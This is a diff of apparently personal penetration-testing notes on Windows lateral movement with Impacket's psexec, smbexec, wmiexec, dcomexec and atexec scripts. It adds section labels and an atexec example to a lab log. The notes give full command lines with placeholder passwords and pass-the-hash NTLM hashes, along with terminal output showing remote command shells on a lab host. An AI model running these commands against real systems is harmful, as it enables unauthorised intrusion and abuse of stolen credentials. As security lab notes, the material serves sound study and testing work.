@@ -91,12 +91,9 @@ Type help for list of commands
  
  ----------------------------------------
  
-
 lateral movement
 
-Original post
-
-https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/#1-impacket-psexecpy
+Original post - https://www.infosecmatter.com/rce-on-windows-from-linux-part-1-impacket/#1-impacket-psexecpy
 
 Domain Admin account
 
@@ -126,6 +123,8 @@ Local Admin account
 
 psexec.py "./Add_your_user_name_yo:Add_Your_PassWordsYo1!"@192.168.1.200
 
+psexec.py user account
+
 root@kali:~/Documents/impacket/examples# python psexec.py "./Add_your_user_name_yo:Add_Your_PassWordsYo1!"@192.168.1.200
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
@@ -141,6 +140,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
 
+psexec.py hash
 
 root@kali:~/Documents/impacket/examples# psexec.py -hashes aad3b435b51303909808abc1251404ee:fc525c9683e8fe666808aef123971889 "./Administrator"@192.168.1.200
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
@@ -159,6 +159,8 @@ C:\Windows\system32>
 
 ------------------------------------
 
+dcomexec.py
+
 I suspect it only works with SMBv3?
 
 root@kali:~/Documents/impacket/examples# dcomexec.py "./Add_your_user_name_yo:Add_Your_PassWordsYo1!"@192.168.1.200
@@ -169,6 +171,8 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 
 -------------------------------------
+
+smbexec.py user account
 
 smbexec.py "./Add_your_user_name_yo:Add_Your_PassWordsYo1!"@192.168.1.200
 
@@ -196,6 +200,7 @@ Tunnel aAdd_your_user_name_yopter isatap.{8AA197BF-E3C8-4397-B277-7135B83C4BA0}:
 
 C:\Windows\system32>
 
+smbexec.py hash
 
 smbexec.py -hashes aad3b435b51303909808abc1251404ee:fc525c9683e8fe666808aef123971889 "./Administrator"@192.168.1.200
 
@@ -223,6 +228,8 @@ Tunnel aAdd_your_user_name_yopter isatap.{8AA197BF-E3C8-4397-B277-7135B83C4BA0}:
 
 
 -------------------------------------
+
+wmiexec.py user account
 
 wmiexec.py "./Add_your_user_name_yo:Add_Your_PassWordsYo1!"@192.168.1.200
 
@@ -253,6 +260,8 @@ wmiexec.py -hashes aad3b435b51303909808abc1251404ee:fc525c9683e8fe666808aef12397
 
 ------------------------------------------
 
+wmiexec.py hash
+
 root@kali:~/Documents/impacket/examples# wmiexec.py -hashes aad3b435b51303909808abc1251404ee:fc525c9683e8fe666808aef123971889 "./Administrator"@192.168.1.200
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
@@ -281,9 +290,13 @@ C:\>
 
 -------------------------------------
 
-9.21-dev - Copyright 2019 SecureAuth Corporation
+atexec.py
+
+root@kali:~/Documents/impacket/examples# atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889 "./Administrator"@192.168.1.200 "systeminfo"
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 
 [!] This will work ONLY on Windows >= Vista
+
 [*] Creating task \xKHbNiPY
 [*] Running task \xKHbNiPY
 [*] Deleting task \xKHbNiPY
